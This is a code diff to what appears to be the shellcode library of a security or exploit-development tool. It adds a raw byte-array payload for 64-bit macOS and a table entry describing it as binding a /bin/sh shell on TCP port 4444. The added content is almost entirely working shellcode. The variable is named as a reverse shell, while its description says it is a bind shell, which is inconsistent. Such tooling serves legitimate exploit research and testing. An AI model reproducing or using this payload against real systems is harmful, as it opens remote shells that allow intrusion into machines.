@@ -864,6 +864,17 @@ char x64_osx_reverse_tcp[] =
 	"\x31\xd2\x49\xbd\xff\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xed"
 	"\x08\x41\x55\x48\x89\xe7\x48\x31\xf6\x0f\x05";
 
+char x64_osx_reverse_tcp_rop[] =
+	"\x41\xb0\x02\x49\xc1\xe0\x18\x49\x83\xc8\x61\x4c\x89\xc0\x48"
+	"\x31\xd2\x48\x89\xd6\x48\xff\xc6\x48\x89\xf7\x48\xff\xc7\x0f"
+	"\x05\x49\x89\xc4\x49\xbd\x01\x01\x11\x5c\xff\xff\xff\xff\x41"
+	"\xb1\xff\x4d\x29\xcd\x41\x55\x49\x89\xe5\x49\xff\xc0\x4c\x89"
+	"\xc0\x4c\x89\xe7\x4c\x89\xee\x48\x83\xc2\x10\x0f\x05\x49\x83"
+	"\xe8\x08\x48\x31\xf6\x4c\x89\xc0\x4c\x89\xe7\x0f\x05\x48\x83"
+	"\xfe\x02\x48\xff\xc6\x76\xef\x49\x83\xe8\x1f\x4c\x89\xc0\x48"
+	"\x31\xd2\x49\xbd\xff\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xed"
+	"\x08\x41\x55\x48\x89\xe7\x48\x31\xf6\x0f\x05";
+
 #define ENTRY(a,b,c,x,y,z) { .name=x, .desc=z, .data=(unsigned char *)&y, .len=sizeof(y)-1, \
 	.cmd=a, .host=b, .port=c },
 #define ENTRY_NULL() { NULL, NULL, NULL, 0 }
@@ -893,6 +904,7 @@ struct shellcode_t shellcodes[] = {
  ENTRY(0,0,0,"x64.linux.binsh",       x64_linux_binsh,                 "Runs /bin/sh on 64 bits" )
  ENTRY(0,0,0,"x64.osx.suidsh",        x64_osx_suidsh,                  "Setuid(0) and runs /bin/sh")
  ENTRY(0,43,39,"x64.osx.reverse",     x64_osx_reverse_tcp,             "OSX reverse connect shell")
+ ENTRY(0,0,0,"x64.osx.bind4444.rop",  x64_osx_reverse_tcp_rop,        "Binds a shell at port 4444/tcp using ROP" )
  ENTRY(0,0,0,"x86.bsd.binsh",         x86_bsd_binsh,                   "Executes /bin/sh" )
  ENTRY(0,0,0,"x86.bsd.binsh2",        x86_bsd_binsh2,                  "Executes /bin/sh" )
  ENTRY(0,0,0,"x86.bsd.suidsh",        x86_bsd_suidsh,                  "Setuid(0) and runs /bin/sh" )
